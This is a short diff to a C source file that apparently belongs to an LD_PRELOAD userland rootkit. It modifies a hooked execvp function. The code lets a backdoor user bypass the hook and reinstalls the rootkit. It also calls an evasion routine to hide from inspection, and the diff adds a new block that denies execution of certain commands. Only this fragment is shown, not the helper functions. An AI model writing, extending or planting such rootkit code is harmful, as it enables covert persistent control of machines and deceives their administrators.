@@ -1,8 +1,8 @@
 int execvp(const char *filename, char *const argv[])
 {
-    #ifdef DO_REINSTALL
+#ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
-    #endif
+#endif
     hook(CEXECVP);
 
     if(is_bdusr()) return (long)call(CEXECVP, filename, argv);
@@ -11,7 +11,7 @@ int execvp(const char *filename, char *const argv[])
         return -1;
     }
 
-    #if defined(HIDE_SELF) && defined(DO_REINSTALL)
+#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
     int evasion_status = evade(filename, argv, NULL);
     switch(evasion_status)
     {
@@ -27,7 +27,14 @@ int execvp(const char *filename, char *const argv[])
         case VNOTHING_DONE:
             break;  /* ?? */
     }
-    #endif
+#endif
+
+#ifdef BLOCK_STRINGS
+    if(block_strings(argv)){
+        errno = EPERM;
+        return -1;
+    }
+#endif
     
     return (long)call(CEXECVP, filename, argv);
 }
